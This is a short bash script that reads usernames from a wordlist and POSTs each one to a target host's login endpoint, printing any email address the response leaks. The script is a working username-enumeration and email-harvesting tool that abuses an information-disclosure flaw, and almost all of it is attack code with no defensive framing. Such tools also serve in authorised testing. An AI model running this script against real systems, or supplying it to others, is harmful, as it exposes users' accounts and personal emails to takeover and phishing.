#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <RHOST> <dictionary_file>"
    exit 1
fi

# Assign arguments to variables
RHOST=$1
dictionary_file=$2

# Loop through each username in the dictionary file
while read -r username; do
    # Send the POST request and save the response
    response=$(curl -s "https://$RHOST/login?redirectPath=%2F" -d "{\"username\":\"$username\"}" -H 'Content-Type: application/json')
    
    # Check if the response contains 'user_email'
    if echo "$response" | grep -q 'user_email'; then
        # Extract and print the email address
        echo "$response" | jq -r .user_email | cut -d '"' -f 2
    fi
done < "$dictionary_file"
